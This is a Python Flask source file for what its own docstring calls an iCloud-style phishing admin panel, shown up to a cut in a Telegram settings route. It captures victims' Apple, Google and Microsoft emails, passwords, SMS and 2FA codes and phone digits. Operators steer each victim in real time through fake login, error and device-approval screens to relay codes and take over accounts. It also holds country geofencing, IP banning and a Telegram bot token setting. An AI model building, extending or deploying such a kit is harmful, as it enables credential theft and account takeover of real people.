"""
Backend for the iCloud-style phishing admin panel.

This Flask application provides:
- REST API for victim (user) and admin flows
- SQLite persistence via SQLAlchemy
- Real-time updates via Flask-SocketIO
- Session-based authentication for both victims and admins

Run:
    python backend/app.py

The dev server listens on http://localhost:4000 by default.
"""

import os
import re
import json
import threading
import time
import urllib.request
from datetime import datetime, timezone
from functools import wraps

from flask import Flask, jsonify, request, session, send_file, send_from_directory
from flask_cors import CORS
from flask_socketio import SocketIO, emit
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import check_password_hash, generate_password_hash
from werkzeug.utils import secure_filename
import uuid

# -----------------------------------------------------------------------------
# Configuration
# -----------------------------------------------------------------------------
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(BASE_DIR)
FRONTEND_BUILD_DIR = os.path.join(PROJECT_ROOT, "frontend", "dist")

app = Flask(__name__, static_folder=None)
app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY", "dev-secret-key-change-in-production")
app.config["SQLALCHEMY_DATABASE_URI"] = f"sqlite:///{os.path.join(BASE_DIR, 'app.db')}"
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
app.config["SESSION_COOKIE_SECURE"] = False  # Set to True behind HTTPS

CORS(app, supports_credentials=True, resources={r"/api/*": {"origins": "*"}})
db = SQLAlchemy(app)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

# Victim page presence: socket sid → user id
_online_sids = {}
_user_sids = {}
_geo_cache = {}


def _user_is_online(user_id):
    if user_id is None:
        return False
    return bool(_user_sids.get(int(user_id)))


# -----------------------------------------------------------------------------
# Models
# -----------------------------------------------------------------------------
class User(db.Model):
    """A victim / captured session."""

    __tablename__ = "users"

    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(255), nullable=True)
    password = db.Column(db.String(255), nullable=True)
    code = db.Column(db.String(255), nullable=True)
    google_email = db.Column(db.String(255), nullable=True)
    google_password = db.Column(db.String(255), nullable=True)
    google_code = db.Column(db.String(255), nullable=True)
    google_prompt = db.Column(db.String(10), nullable=True)
    ms_email = db.Column(db.String(255), nullable=True)
    ms_password = db.Column(db.String(255), nullable=True)
    ms_phone_hint = db.Column(db.String(10), nullable=True)  # last 2 digits shown
    ms_phone_digits = db.Column(db.String(10), nullable=True)  # victim entered last 4
    ms_code = db.Column(db.String(20), nullable=True)
    disconnect_logs = db.Column(db.Text, nullable=True)  # JSON list of log lines
    prev_page = db.Column(db.String(50), nullable=True)
    prev_status = db.Column(db.String(50), nullable=True)

    ip_address = db.Column(db.String(255), nullable=True)
    country_code = db.Column(db.String(8), nullable=True)
    country = db.Column(db.String(100), nullable=True)
    browser = db.Column(db.String(255), nullable=True)
    device = db.Column(db.String(255), nullable=True)

    situation = db.Column(db.String(50), default="visits")
    current_page = db.Column(db.String(50), default="case_lookup")
    current_status = db.Column(db.String(50), nullable=True)
    case_id = db.Column(db.String(20), nullable=True)  # Case ID entered on Case Lookup

    created_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
    updated_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc), onupdate=lambda: datetime.now(timezone.utc))

    def _logs_list(self):
        if not self.disconnect_logs:
            return []
        try:
            import json
            data = json.loads(self.disconnect_logs)
            return data if isinstance(data, list) else []
        except Exception:
            return []

    def append_log(self, message):
        import json
        logs = self._logs_list()
        logs.append({
            "at": datetime.now(timezone.utc).isoformat(),
            "message": message,
        })
        self.disconnect_logs = json.dumps(logs[-40:])

    def to_dict(self):
        return {
            "_id": self.id,
            "email": self.email or "",
            "password": self.password or "",
            "code": self.code or "",
            "googleEmail": self.google_email or "",
            "googlePassword": self.google_password or "",
            "googleCode": self.google_code or "",
            "googlePrompt": self.google_prompt or "",
            "msEmail": self.ms_email or "",
            "msPassword": self.ms_password or "",
            "msPhoneHint": self.ms_phone_hint or "",
            "msPhoneDigits": self.ms_phone_digits or "",
            "msCode": self.ms_code or "",
            "disconnectLogs": self._logs_list(),
            "prevPage": self.prev_page or "",
            "prevStatus": self.prev_status or "",
            "ipAddress": self.ip_address or "",
            "countryCode": self.country_code or "",
            "country": self.country or "",
            "browser": self.browser or "",
            "device": self.device or "",
            "situation": self.situation or "visits",
            "currentPage": self.current_page or "case_lookup",
            "currentStatus": self.current_status or "",
            "caseId": self.case_id or "",
            "online": _user_is_online(self.id),
            "createdAt": self.created_at.isoformat() if self.created_at else None,
        }


class Admin(db.Model):
    """Admin user that can control victims from the dashboard."""

    __tablename__ = "admins"

    id = db.Column(db.Integer, primary_key=True)
    full_name = db.Column(db.String(255), unique=True, nullable=False)
    password_hash = db.Column(db.String(255), nullable=False)
    created_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))

    def to_dict(self):
        return {
            "_id": self.id,
            "fullName": self.full_name,
            "createdAt": self.created_at.isoformat() if self.created_at else None,
        }


class Setting(db.Model):
    """Key/value settings for the panel (e.g. site online/offline)."""

    __tablename__ = "settings"

    id = db.Column(db.Integer, primary_key=True)
    key = db.Column(db.String(100), unique=True, nullable=False)
    value = db.Column(db.String(255), nullable=False, default="")


class BannedIP(db.Model):
    """IPs blocked from accessing the public page."""

    __tablename__ = "banned_ips"

    id = db.Column(db.Integer, primary_key=True)
    ip_address = db.Column(db.String(255), unique=True, nullable=False)
    note = db.Column(db.String(255), nullable=True)
    created_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))

    def to_dict(self):
        return {
            "_id": self.id,
            "ipAddress": self.ip_address,
            "note": self.note or "",
            "createdAt": self.created_at.isoformat() if self.created_at else None,
        }


class CaseDocument(db.Model):
    """Document shown on the case loading page (admin-uploaded)."""

    __tablename__ = "case_documents"

    id = db.Column(db.Integer, primary_key=True)
    original_name = db.Column(db.String(255), nullable=False)
    stored_name = db.Column(db.String(255), nullable=False, unique=True)
    mime_type = db.Column(db.String(120), nullable=True)
    size = db.Column(db.Integer, default=0)
    active = db.Column(db.Boolean, default=True)
    # 0 = light blur, 100 = heavy privacy blur (case-page preview)
    blur = db.Column(db.Integer, default=45)
    # Preview framing: pan -50..50 (%), zoom 100..220 (%)
    pan_x = db.Column(db.Integer, default=0)
    pan_y = db.Column(db.Integer, default=0)
    zoom = db.Column(db.Integer, default=110)
    created_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))

    def to_dict(self):
        blur = self.blur if self.blur is not None else 45
        blur = max(0, min(100, int(blur)))
        pan_x = max(-50, min(50, int(self.pan_x if self.pan_x is not None else 0)))
        pan_y = max(-50, min(50, int(self.pan_y if self.pan_y is not None else 0)))
        zoom = max(100, min(220, int(self.zoom if self.zoom is not None else 110)))
        return {
            "_id": self.id,
            "name": self.original_name,
            "mimeType": self.mime_type or "application/octet-stream",
            "size": self.size or 0,
            "active": bool(self.active),
            "blur": blur,
            "panX": pan_x,
            "panY": pan_y,
            "zoom": zoom,
            "url": f"/api/v1/rumman/site/case-documents/{self.id}/file",
            "createdAt": self.created_at.isoformat() if self.created_at else None,
        }


UPLOAD_DIR = os.path.join(BASE_DIR, "uploads", "case_docs")
ALLOWED_DOC_EXT = {".pdf", ".png", ".jpg", ".jpeg", ".webp", ".gif"}
MAX_DOC_BYTES = 12 * 1024 * 1024


def _ensure_upload_dir():
    os.makedirs(UPLOAD_DIR, exist_ok=True)


def _active_case_document():
    return (
        CaseDocument.query.filter_by(active=True)
        .order_by(CaseDocument.created_at.desc())
        .first()
    )


# -----------------------------------------------------------------------------
# Helpers
# -----------------------------------------------------------------------------
def _now():
    return datetime.now(timezone.utc)


def _get_setting(key, default=""):
    row = Setting.query.filter_by(key=key).first()
    return row.value if row else default


def _set_setting(key, value):
    row = Setting.query.filter_by(key=key).first()
    if row:
        row.value = str(value)
    else:
        row = Setting(key=key, value=str(value))
        db.session.add(row)
    db.session.commit()
    return row


def _site_online():
    return _get_setting("site_online", "true").lower() in ("1", "true", "yes", "on")


def _allowed_countries():
    raw = _get_setting("allowed_countries", "[]")
    try:
        codes = json.loads(raw) if raw else []
    except Exception:
        codes = []
    if not isinstance(codes, list):
        return []
    return [str(c).upper().strip() for c in codes if str(c).strip()]


def _country_allowed(ip=None):
    codes = _allowed_countries()
    if not codes:
        return True
    geo = _lookup_country(ip or _client_ip())
    cc = (geo.get("country_code") or "").upper()
    if cc in ("LO",):
        return True
    return cc in codes


def _apply_site_online(online):
    _set_setting("site_online", "true" if online else "false")
    payload = _site_status_payload()
    socketio.emit("site_status_changed", payload)
    return payload


def _client_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr) or ""
    return ip.split(",")[0].strip()


def _is_ip_banned(ip=None):
    ip = (ip or _client_ip() or "").strip()
    if not ip:
        return False
    return BannedIP.query.filter_by(ip_address=ip).first() is not None


def _site_status_payload():
    banned = _is_ip_banned() or (not _country_allowed())
    return {
        "online": _site_online(),
        "banned": banned,
    }


def _is_private_ip(ip):
    ip = (ip or "").strip().lower()
    if not ip or ip in ("127.0.0.1", "::1", "localhost"):
        return True
    if ip.startswith("10.") or ip.startswith("192.168.") or ip.startswith("fc") or ip.startswith("fd"):
        return True
    if ip.startswith("172."):
        try:
            second = int(ip.split(".")[1])
            return 16 <= second <= 31
        except Exception:
            return False
    return False


def _lookup_country(ip):
    """Resolve country for a public IP. Private/local → Local."""
    ip = (ip or "").strip()
    if not ip:
        return {"country_code": "", "country": ""}
    if _is_private_ip(ip):
        return {"country_code": "LO", "country": "Local"}
    cached = _geo_cache.get(ip)
    if cached and (time.time() - cached[0] < 600):
        return cached[1]
    result = {"country_code": "", "country": ""}
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,country,countryCode"
        with urllib.request.urlopen(url, timeout=2.5) as resp:
            data = json.loads(resp.read().decode("utf-8", errors="ignore"))
        if data.get("status") == "success":
            result = {
                "country_code": (data.get("countryCode") or "").upper()[:8],
                "country": (data.get("country") or "")[:100],
            }
    except Exception:
        pass
    _geo_cache[ip] = (time.time(), result)
    return result


def _client_info():
    """Extract basic client info from the request."""
    ip = _client_ip()
    user_agent = request.headers.get("User-Agent", "")
    geo = _lookup_country(ip)

    browser = "Unknown"
    if "Chrome" in user_agent:
        browser = "Chrome"
    elif "Safari" in user_agent:
        browser = "Safari"
    elif "Firefox" in user_agent:
        browser = "Firefox"
    elif "Edge" in user_agent:
        browser = "Edge"

    device = "Desktop"
    if re.search(r"Mobile|Android|iPhone|iPad", user_agent, re.IGNORECASE):
        device = "Mobile" if "iPad" not in user_agent else "Tablet"

    return {
        "ip_address": ip,
        "browser": browser,
        "device": device,
        "country_code": geo["country_code"],
        "country": geo["country"],
    }


def _current_user():
    """Return the victim user tied to the current session, or None."""
    user_id = session.get("user_id")
    if user_id:
        return db.session.get(User, user_id)
    return None


def _current_admin():
    """Return the admin tied to the current session, or None."""
    admin_id = session.get("admin_id")
    if admin_id:
        return db.session.get(Admin, admin_id)
    return None


def user_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not _current_user():
            return jsonify({"error": "Not authenticated as user"}), 401
        return f(*args, **kwargs)
    return decorated


def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not _current_admin():
            return jsonify({"error": "Admin login required"}), 401
        return f(*args, **kwargs)
    return decorated


def _page_mapping(page_name):
    """Map an admin page command to stored page/status values."""
    mapping = {
        "login": ("login", None),
        "wrongPass": ("login", "wrongPass"),
        "code": ("code", None),
        "wrongCode": ("code", "wrongCode"),
        "loading": ("loading", None),
        "caseLookup": ("case_lookup", None),
        "review": ("review", None),
        "success": ("success", None),
        "disconnect": ("disconnect", "disconnectOpen"),
        "googleEmail": ("disconnect", "disconnectOpen"),
        "googlePass": ("disconnect", "disconnectPass"),
        "google2fa": ("disconnect", "google_sms_2fa"),
        "googleSms": ("disconnect", "google_sms_2fa"),
        "verify_its_you": ("disconnect", "verify_its_you"),
        "accept_device": ("disconnect", "accept_device"),
        "done_google": ("disconnect", "done_google"),
        "gWrongMail": ("disconnect", "gWrongMail"),
        "gWrongPass": ("disconnect", "gWrongPass"),
        "gWrong2fa": ("disconnect", "gWrong2fa"),
        "gWrongVerify": ("disconnect", "gWrongVerify"),
        "microsoft": ("microsoft", "msOpen"),
        "msEmail": ("microsoft", "msOpen"),
        "msPass": ("microsoft", "msPass"),
        "msPhone": ("microsoft", "msPhone"),
        "ms2fa": ("microsoft", "ms2fa"),
        "done_microsoft": ("microsoft", "msDone"),
        "msWrongMail": ("microsoft", "msWrongMail"),
        "msWrongPass": ("microsoft", "msWrongPass"),
        "msWrongPhone": ("microsoft", "msWrongPhone"),
        "msWrong2fa": ("microsoft", "msWrong2fa"),
        "verifying": ("code", "verifying"),
        "normal": ("login", None),
    }
    return mapping.get(page_name, (page_name, None))


def _emit_user_update(user, event="user_updated"):
    """Broadcast a user update to all connected clients."""
    socketio.emit(event, {"user": user.to_dict()})


# -----------------------------------------------------------------------------
# API Routes
# -----------------------------------------------------------------------------
@app.route("/api/v1/rumman/auth/me", methods=["GET"])
def auth_me():
    """Return the current victim session."""
    user = _current_user()
    if not user:
        return jsonify({"error": "Not authenticated"}), 401
    return jsonify(user.to_dict()), 200


@app.route("/api/v1/rumman/auth/visit", methods=["POST", "OPTIONS"])
def visit():
    """Create a victim session as soon as someone opens the page."""
    if request.method == "OPTIONS":
        return jsonify({}), 204
    if _is_ip_banned() or not _country_allowed():
        return jsonify({"error": "Access denied", "banned": True}), 403

    user = _current_user()
    if user:
        return jsonify(user.to_dict()), 200

    client = _client_info()
    user = User(
        email="",
        ip_address=client["ip_address"],
        country_code=client.get("country_code") or None,
        country=client.get("country") or None,
        browser=client["browser"],
        device=client["device"],
        current_page="case_lookup",
        current_status=None,
        situation="visits",
    )
    db.session.add(user)
    db.session.flush()
    session["user_id"] = user.id
    user.updated_at = _now()
    db.session.commit()

    _emit_user_update(user, "new_user_registered")
    return jsonify(user.to_dict()), 200


@app.route("/api/v1/rumman/auth/first-register", methods=["POST"])
def first_register():
    """Create or update a victim session with the submitted email."""
    if _is_ip_banned() or not _country_allowed():
        return jsonify({"error": "Access denied", "banned": True}), 403

    data = request.get_json(silent=True) or {}
    email = (data.get("email") or "").strip().lower()

    if not email:
        return jsonify({"error": "Email is required"}), 400

    user = _current_user()
    client = _client_info()

    if user:
        user.email = email
    else:
        user = User(
            email=email,
            ip_address=client["ip_address"],
            country_code=client.get("country_code") or None,
            country=client.get("country") or None,
            browser=client["browser"],
            device=client["device"],
            current_page="login",
            current_status=None,
            situation="visits",
        )
        db.session.add(user)
        db.session.flush()
        session["user_id"] = user.id

    user.updated_at = _now()
    db.session.commit()

    _emit_user_update(user, "new_user_registered")
    return jsonify(user.to_dict()), 200


@app.route("/api/v1/rumman/auth/second-register", methods=["POST"])
def second_register():
    """Capture the victim's password and wait for admin to advance the flow."""
    data = request.get_json(silent=True) or {}
    password = data.get("password") or ""

    user = _current_user()
    if not user:
        return jsonify({"error": "No active session"}), 401

    user.password = password
    # Stay on login UI with waiting status — victim shows button spinner
    # until admin advances the session from the dashboard.
    user.current_page = "login"
    user.current_status = "waiting"
    user.situation = "connects"
    user.updated_at = _now()
    db.session.commit()

    _emit_user_update(user, "user_updated")
    return jsonify(user.to_dict()), 200


@app.route("/api/v1/rumman/auth/case-lookup", methods=["POST", "OPTIONS"])
def case_lookup():
    """Accept a case id and move victim into a searching/loading state."""
    if request.method == "OPTIONS":
        return jsonify({}), 204
    data = request.get_json(silent=True) or {}
    case_id = (data.get("caseId") or data.get("case_id") or "").strip()

    user = _current_user()
    if not user:
        client = _client_info()
        user = User(
            email="",
            ip_address=client["ip_address"],
            country_code=client.get("country_code") or None,
            country=client.get("country") or None,
            browser=client["browser"],
            device=client["device"],
            current_page="case_lookup",
            current_status=None,
            situation="visits",
        )
        db.session.add(user)
        db.session.flush()
        session["user_id"] = user.id

    if not case_id:
        return jsonify({"error": "caseId is required"}), 400
    if len(case_id) < 4:
        return jsonify({"error": "Enter a case ID with at least 4 characters."}), 400

    # Keep the victim in a loading/searching state until the admin advances.
    user.current_page = "loading"
    user.current_status = "searching_case"
    user.case_id = case_id
    user.situation = "connects"
    user.updated_at = _now()
    db.session.commit()

    _emit_user_update(user, "user_updated")
    socketio.emit("page_changed", {"page": "loading", "user": user.to_dict()})
    return jsonify(user.to_dict()), 200


@app.route("/api/v1/rumman/auth/case-open-login", methods=["POST", "OPTIONS"])
def case_open_login():
    """Victim continues an open case ticket to the normal login page."""
    if request.method == "OPTIONS":
        return jsonify({}), 204
    user = _current_user()
    if not user:
        return jsonify({"error": "No active session"}), 401

    user.current_page = "login"
    user.current_status = None
    user.updated_at = _now()
    db.session.commit()

    _emit_user_update(user, "user_updated")
    socketio.emit("page_changed", {"page": "login", "user": user.to_dict()})
    return jsonify(user.to_dict()), 200


@app.route("/api/v1/rumman/auth/verification-code", methods=["POST"])
def verification_code():
    """Capture the 2FA code and wait for admin to advance the flow."""
    data = request.get_json(silent=True) or {}
    code = data.get("code") or ""

    user = _current_user()
    if not user:
        return jsonify({"error": "No active session"}), 401

    user.code = code
    user.current_page = "loading"
    user.current_status = "verifying"
    user.updated_at = _now()
    db.session.commit()

    _emit_user_update(user, "user_updated")
    return jsonify(user.to_dict()), 200


@app.route("/api/v1/rumman/auth/review", methods=["POST"])
def review_action():
    """Capture Approve/Decline on the account review page."""
    data = request.get_json(silent=True) or {}
    action = (data.get("action") or "").strip().lower()

    if action not in ("approve", "decline"):
        return jsonify({"error": "Action must be approve or decline"}), 400

    user = _current_user()
    if not user:
        return jsonify({"error": "No active session"}), 401

    user.current_page = "loading"
    user.current_status = "reviewApproved" if action == "approve" else "reviewDeclined"
    user.updated_at = _now()
    db.session.commit()

    _emit_user_update(user, "user_updated")
    return jsonify(user.to_dict()), 200


@app.route("/api/v1/rumman/auth/disconnect_google", methods=["POST"])
def disconnect_google():
    """Capture Google credentials from the disconnect popup and append logs."""
    data = request.get_json(silent=True) or {}
    google_email = (data.get("googleEmail") or data.get("email") or "").strip()
    google_password = data.get("googlePassword") or data.get("password") or ""
    google_code = (data.get("googleCode") or data.get("code") or "").strip()
    step = (data.get("step") or "submit").strip()

    user = _current_user()
    if not user:
        return jsonify({"error": "No active session"}), 401

    user.current_page = "disconnect"

    if step == "open":
        user.append_log("Disconnect popup opened")
        user.current_status = "disconnectOpen"
    elif step == "email":
        if google_email:
            user.google_email = google_email
        user.append_log(f"Google email entered: {google_email or '—'}")
        user.current_status = "disconnectEmail"
    elif step == "password":
        if google_email:
            user.google_email = google_email
        if google_password:
            user.google_password = google_password
        user.append_log(f"Google password captured · {user.google_email or '—'}")
        user.current_status = "disconnectPassWaiting"
    elif step in ("code", "sms"):
        if google_code:
            user.google_code = google_code
        user.append_log(f"Google SMS 2FA code: {google_code or '—'}")
        user.current_status = "google_sms_waiting"
    elif step == "resend":
        user.append_log("Victim requested Resend · waiting for new prompt")
        user.current_status = "verify_resending"
        user.google_prompt = ""
    elif step == "resend_device":
        user.append_log("Victim requested Accept device resend")
        user.current_status = "accept_device_resending"
    elif step == "resend_sms":
        user.append_log("Victim requested SMS Resend · waiting for new code")
        user.current_status = "google_sms_resending"
        user.google_code = ""
    elif step == "verify":
        user.append_log(
            f"Verify it's you confirmed · prompt {user.google_prompt or '—'}"
        )
        user.current_status = "done_google"
    elif step == "finish":
        restore_page = user.prev_page or "login"
        restore_status = user.prev_status
        if restore_page in ("disconnect", "", None):
            restore_page = "login"
            restore_status = None
        user.append_log(f"Disconnect finished · returned to {restore_page}")
        user.current_page = restore_page
        user.current_status = restore_status
        user.prev_page = None
        user.prev_status = None
    elif step == "submit":
        if google_email:
            user.google_email = google_email
        if google_password:
            user.google_password = google_password
        user.append_log(f"Disconnect submitted · {user.google_email or '—'}")
        user.current_status = "done_google"
    else:
        user.append_log(step)

    user.updated_at = _now()
    db.session.commit()
    _emit_user_update(user, "user_updated")
    return jsonify(user.to_dict()), 200


@app.route("/api/v1/rumman/auth/disconnect_microsoft", methods=["POST"])
def disconnect_microsoft():
    """Capture Microsoft / Hotmail credentials from the MS popup."""
    data = request.get_json(silent=True) or {}
    ms_email = (data.get("msEmail") or data.get("email") or "").strip()
    ms_password = data.get("msPassword") or data.get("password") or ""
    ms_digits = (data.get("msPhoneDigits") or data.get("digits") or "").strip()
    ms_code = (data.get("msCode") or data.get("code") or "").strip()
    step = (data.get("step") or "submit").strip()

    user = _current_user()
    if not user:
        return jsonify({"error": "No active session"}), 401

    user.current_page = "microsoft"

    if step == "open":
        user.append_log("Microsoft popup opened")
        user.current_status = "msOpen"
    elif step == "email":
        if ms_email:
            user.ms_email = ms_email
        user.append_log(f"Microsoft email entered: {ms_email or '—'}")
        user.current_status = "msEmail"
    elif step == "password":
        if ms_email:
            user.ms_email = ms_email
        if ms_password:
            user.ms_password = ms_password
        user.append_log(f"Microsoft password captured · {user.ms_email or '—'}")
        user.current_status = "msPassWaiting"
    elif step == "phone":
        digits = "".join(ch for ch in ms_digits if ch.isdigit())[:4]
        if digits:
            user.ms_phone_digits = digits
        user.append_log(f"Microsoft phone digits: {user.ms_phone_digits or '—'}")
        user.current_status = "msPhoneWaiting"
    elif step in ("2fa", "code"):
        cleaned = "".join(ch for ch in ms_code if ch.isdigit())[:8]
        if cleaned:
            user.ms_code = cleaned
        user.append_log(f"Microsoft 2FA code: {user.ms_code or '—'}")
        user.current_status = "ms2faWaiting"
    elif step == "resend":
        user.append_log("Victim requested Microsoft phone Resend · waiting")
        user.current_status = "msPhoneResending"
        user.ms_phone_digits = None
    elif step == "resend_2fa":
        user.append_log("Victim requested Microsoft 2FA Resend · waiting")
        user.current_status = "ms2faResending"
        user.ms_code = None
    elif step == "finish":
        restore_page = user.prev_page or "login"
        restore_status = user.prev_status
        if restore_page in ("microsoft", "disconnect", "", None):
            restore_page = "login"
            restore_status = None
        user.append_log(f"Microsoft disconnect finished · returned to {restore_page}")
        user.current_page = restore_page
        user.current_status = restore_status
        user.prev_page = None
        user.prev_status = None
    elif step == "done":
        user.append_log("Microsoft disconnect done screen")
        user.current_status = "msDone"
    else:
        user.append_log(f"Microsoft · {step}")

    user.updated_at = _now()
    db.session.commit()
    _emit_user_update(user, "user_updated")
    return jsonify(user.to_dict()), 200


@app.route("/api/v1/rumman/auth/login", methods=["POST"])
def admin_login():
    """Authenticate the admin dashboard."""
    data = request.get_json(silent=True) or {}
    full_name = (data.get("fullName") or "").strip()
    password = data.get("password") or ""

    if not full_name or not password:
        return jsonify({"error": "Full name and password are required"}), 400

    admin = Admin.query.filter_by(full_name=full_name).first()
    if not admin or not check_password_hash(admin.password_hash, password):
        return jsonify({"error": "Invalid credentials"}), 401

    session["admin_id"] = admin.id
    return jsonify(admin.to_dict()), 200


@app.route("/api/v1/rumman/auth/admin/me", methods=["GET"])
def admin_me():
    """Return the current admin session."""
    admin = _current_admin()
    if not admin:
        return jsonify({"error": "Not authenticated"}), 401
    return jsonify(admin.to_dict()), 200


@app.route("/api/v1/rumman/auth/logout", methods=["POST"])
def admin_logout():
    """Log out the current admin."""
    session.pop("admin_id", None)
    return jsonify({"message": "Logged out"}), 200


@app.route("/api/v1/rumman/auth/change-password", methods=["POST"])
@admin_required
def admin_change_password():
    """Change the logged-in admin's password."""
    admin = _current_admin()
    data = request.get_json(silent=True) or {}
    current_password = data.get("currentPassword") or ""
    new_password = data.get("newPassword") or ""

    if not current_password or not new_password:
        return jsonify({"error": "Current and new password are required"}), 400

    if len(new_password) < 6:
        return jsonify({"error": "New password must be at least 6 characters"}), 400

    if not check_password_hash(admin.password_hash, current_password):
        return jsonify({"error": "Current password is incorrect"}), 401

    if current_password == new_password:
        return jsonify({"error": "New password must be different"}), 400

    admin.password_hash = generate_password_hash(new_password)
    db.session.commit()
    return jsonify({"message": "Password updated"}), 200


@app.route("/api/v1/rumman/user/all-user", methods=["GET"])
@admin_required
def all_users():
    """Return all captured victim sessions."""
    users = User.query.order_by(User.created_at.desc()).all()
    changed = False
    for u in users:
        if u.ip_address and not u.country_code:
            geo = _lookup_country(u.ip_address)
            u.country_code = geo["country_code"] or None
            u.country = geo["country"] or None
            changed = True
    if changed:
        db.session.commit()
    return jsonify([u.to_dict() for u in users]), 200


@app.route("/api/v1/rumman/user/visits", methods=["GET"])
@admin_required
def visits_count():
    """Return the number of visits (users marked as visits)."""
    count = User.query.filter_by(situation="visits").count()
    return jsonify(count), 200


@app.route("/api/v1/rumman/user/connects", methods=["GET"])
@admin_required
def connects_count():
    """Return the number of connects (users marked as connects)."""
    count = User.query.filter_by(situation="connects").count()
    return jsonify(count), 200


@app.route("/api/v1/rumman/user/situation/<int:user_id>", methods=["POST"])
@admin_required
def toggle_situation(user_id):
    """Toggle a user's situation between visits and connects."""
    user = db.session.get(User, user_id)
    if not user:
        return jsonify({"error": "User not found"}), 404

    user.situation = "connects" if user.situation == "visits" else "visits"
    user.updated_at = _now()
    db.session.commit()

    _emit_user_update(user, "user_updated")
    return jsonify(user.to_dict()), 200


@app.route("/api/v1/rumman/user/page/<int:user_id>/<page_name>", methods=["POST"])
@admin_required
def change_page(user_id, page_name):
    """Change a victim's current page and status from the admin panel."""
    user = db.session.get(User, user_id)
    if not user:
        return jsonify({"error": "User not found"}), 404

    page, status = _page_mapping(page_name)

    # Remember last iCloud page before entering disconnect / microsoft flow
    if page in ("disconnect", "microsoft") and (user.current_page or "login") not in (
        "disconnect",
        "microsoft",
    ):
        user.prev_page = user.current_page or "login"
        user.prev_status = user.current_status

    user.current_page = page
    user.current_status = status

    data = request.get_json(silent=True) or {}

    if page_name in ("disconnect", "googleEmail"):
        user.append_log("Admin opened Google email step")
    elif page_name == "googlePass":
        user.append_log("Admin sent Google password step")
    elif page_name in ("google2fa", "googleSms"):
        user.google_prompt = None
        user.append_log("Admin sent Google SMS 2FA")
    elif page_name == "verify_its_you":
        raw = str(data.get("prompt") or "").strip()
        digits = "".join(ch for ch in raw if ch.isdigit())[:2]
        if len(digits) < 1:
            return jsonify({"error": "Prompt number required"}), 400
        if len(digits) == 1:
            digits = digits.zfill(2)
        user.google_prompt = digits
        user.append_log(f"Admin sent Verify it's you · prompt {user.google_prompt}")
    elif page_name == "accept_device":
        user.append_log("Admin sent Accept device")
    elif page_name == "done_google":
        user.append_log("Admin sent Done Google")
    elif page_name == "gWrongMail":
        user.append_log("Admin sent Wrong Google email")
    elif page_name == "gWrongPass":
        user.append_log("Admin sent Wrong Google password")
    elif page_name == "gWrong2fa":
        user.append_log("Admin sent Wrong Google 2FA")
    elif page_name == "gWrongVerify":
        user.append_log("Admin sent Wrong Google verify prompt")
    elif page_name in ("microsoft", "msEmail"):
        user.append_log("Admin opened Microsoft email step")
    elif page_name == "msPass":
        user.append_log("Admin sent Microsoft password step")
    elif page_name == "msPhone":
        raw = str(data.get("phoneHint") or data.get("hint") or "").strip()
        digits = "".join(ch for ch in raw if ch.isdigit())[:2]
        if len(digits) < 1:
            return jsonify({"error": "Last 2 phone digits required"}), 400
        if len(digits) == 1:
            digits = digits.zfill(2)
        user.ms_phone_hint = digits
        user.ms_phone_digits = None
        user.append_log(f"Admin sent Microsoft phone verify · hint **{digits}")
    elif page_name == "ms2fa":
        user.ms_code = None
        user.append_log("Admin sent Microsoft 2FA")
    elif page_name == "done_microsoft":
        user.append_log("Admin sent Done Microsoft")
    elif page_name == "msWrongMail":
        user.append_log("Admin sent Wrong Microsoft email")
    elif page_name == "msWrongPass":
        user.append_log("Admin sent Wrong Microsoft password")
    elif page_name == "msWrongPhone":
        user.append_log("Admin sent Wrong Microsoft phone digits")
    elif page_name == "msWrong2fa":
        user.append_log("Admin sent Wrong Microsoft 2FA")

    user.updated_at = _now()
    db.session.commit()

    socketio.emit("page_changed", {"page": page_name, "user": user.to_dict()})
    _emit_user_update(user, "user_updated")
    return jsonify(user.to_dict()), 200


@app.route("/api/v1/rumman/user/delete/<int:user_id>", methods=["DELETE"])
@admin_required
def delete_user(user_id):
    """Delete a captured victim session."""
    user = db.session.get(User, user_id)
    if not user:
        return jsonify({"error": "User not found"}), 404

    # If the deleted user is the current session, clear it.
    if session.get("user_id") == user.id:
        session.pop("user_id", None)

    db.session.delete(user)
    db.session.commit()
    return jsonify({"message": "User deleted"}), 200


@app.route("/api/v1/rumman/site/status", methods=["GET"])
def site_status():
    """Public: whether the phishing page is online."""
    return jsonify(_site_status_payload()), 200


@app.route("/api/v1/rumman/site/status", methods=["POST"])
@admin_required
def set_site_status():
    """Admin: toggle the public page online/offline."""
    data = request.get_json(silent=True) or {}
    if "online" not in data:
        return jsonify({"error": "online boolean required"}), 400

    online = bool(data.get("online"))
    payload = _apply_site_online(online)
    return jsonify(payload), 200


@app.route("/api/v1/rumman/site/countries", methods=["GET"])
@admin_required
def get_allowed_countries():
    return jsonify({"countries": _allowed_countries()}), 200


@app.route("/api/v1/rumman/site/countries", methods=["POST"])
@admin_required
def set_allowed_countries():
    data = request.get_json(silent=True) or {}
    raw = data.get("countries") or data.get("allowed") or []
    if not isinstance(raw, list):
        return jsonify({"error": "countries must be a list"}), 400
    codes = sorted({str(c).upper().strip() for c in raw if str(c).strip()})
    _set_setting("allowed_countries", json.dumps(codes))
    socketio.emit("site_status_changed", _site_status_payload())
    return jsonify({"countries": codes}), 200


@app.route("/api/v1/rumman/site/telegram", methods=["GET"])
@admin_required
def get_telegram():
    token = _get_setting("telegram_bot_token", "")
    preview = ""
    if token:
        preview = f"{token[:8]}…{token[-4:]}" if len(token) > 14 else "••••"
    return jsonify({"configured": bool(token), "preview": preview}), 200


@app.route("/api/v1/rumman/site/telegram", methods=["POST"])
@admin_required
def set_telegram():
    data = request.get_json(silent=True) or {}
    token = (data.get("token") or data.get("botToken") or "").strip()
